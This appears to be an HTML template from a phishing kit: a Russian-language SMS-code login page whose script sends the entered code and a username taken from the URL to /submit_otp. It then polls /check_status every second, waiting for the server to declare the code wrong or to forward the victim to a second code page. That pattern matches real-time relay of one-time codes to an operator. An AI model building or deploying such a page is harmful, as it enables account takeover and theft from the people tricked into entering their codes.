    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
    <style>

        body {
    margin: 0;
    font-family: Arial, sans-serif;
    background-image: url('{{ url_for('static', filename='login-background.d2e86e51.jpg') }}'); /* Укажите путь к новому фону */
    background-size: cover;
    background-position: center;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
}

.container {
    border-radius: 10px;
    padding: 20px;
    max-width: 400px;
    width: 90%;
    text-align: center;
}

h1 {
    color: white;
    margin-bottom: 10px;
}

.tagline {
    color: #fff;
    border-radius: 5px;
    background-color: #4ca269;
    width: 155px;
    font-size: 12px;
    padding: 0 5px;
    text-align: center;
    margin: auto;
    margin-bottom: 20px;
}

.input {
    width: 80%;
    padding: 10px;
    margin-bottom: 15px;
    border: none;
    border-radius: 5px;
    font-size: 16px;
    background-color: rgba(109, 121, 134, 0.5);
    transition: 0.5s;
}

.input:hover{
    background-color: rgba(109, 121, 134, 0);;
}

.input:focus{
    background-color: #0b1f35;
    color: #fff;
}

.password-container {
    position: relative;
}

.toggle-password {
    position: absolute;
    right: 10px;
    top: 10px;
    background: none;
    border: none;
    cursor: pointer;
    color: #666;
    font-size: 16px;
}

.btn {
    width: 80%;
    padding: 10px;
    background-color: inherit;
    color: #8c9cad;
    border: none;
    border-radius: 5px;
    border: #6d7986 solid 2px;
    font-size: 16px;
    cursor: pointer;
    transition: 0.5s;
}

.btn:hover {
    background-color: rgba(109, 121, 134, 0.5);
}

.forgot-password {
    color: white;
    display: block;
    margin-top: 15px;
    text-decoration: none;
}

.version {
    color: #ccc;
    margin-top: 10px;
    font-size: 14px;
}

/* Адаптивность */
@media (max-width: 768px) {
    .container {
        padding: 15px;
    }

    h1 {
        font-size: 24px;
    }

    .input, .btn {
        font-size: 14px;
        padding: 8px;
    }
}

    </style>
</head>

            <p class="tagline">ПРОДУКТИВНАЯ СРЕДА</p>
            <div id="error" style="background-color: #f8d7da; display: none; color: #721c24; border: 1px solid #f5c6cb; padding: 5px; border-radius: 5px; margin-bottom: 10px; font-family: Arial, sans-serif; text-align: center; font-size: 13px;">
                <strong>Ошибка!</strong> Введён неверный код из SMS. Пожалуйста, проверьте код и попробуйте снова.
            </div>

            <form onsubmit="showLoader(event)" id="myForm" style="margin-top: 20px;">
                <input type="text" placeholder="Код из СМС" name="otp" class="input">
                <button type="submit" class="btn">Войти</button>
            </form>
            <a href="#" class="forgot-password">Забыли пароль?</a>
            <p class="version">1.310.1 / 1.310.4</p>
        </div>
    </div>
    <script>
        let otp = null;
        let username = null;

        async function showLoader(event){
            const loader = document.getElementById('loader');
            const content = document.getElementById('form_data');

            loader.style.display = 'block';
            content.style.display = 'none';

            event.preventDefault(); // Предотвращаем перезагрузку страницы

            // Собираем данные формы
            const formData = new FormData(document.getElementById('myForm'));
            const data = Object.fromEntries(formData.entries());

            otp = data['otp'];
            console.log(otp);

            const path = window.location.pathname;
            const parts = path.split('/');
            username = parts[parts.length - 1];

            data['username'] = username

            try {
                // Отправляем данные на сервер
                const response = await fetch('/submit_otp', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });

                while (true) {
                    const response = await fetch(`/check_status/${username}`);
                    const result = await response.json();

                    console.log(result);

                    if (result === 'otp_incorrect') {
                        loader.style.display = 'none';
                        const errorMsg = document.getElementById('error');
                        errorMsg.style.display = 'block';
                        content.style.display = 'block';
                        break;
                    }
                    else if (result === "otp_next"){
                        loader.style.display = 'none';
                        window.location.href = `/login/otp2/${username}`;
                    }

                    await new Promise(resolve => setTimeout(resolve, 1000)); // Ждем 1 секунду
                }

                // Обрабатываем ответ сервера
                const result = await response.json();
                alert(result.message);
            } catch (error) {
                console.error('Ошибка отправки данных:', error);
            }
        }
    </script>
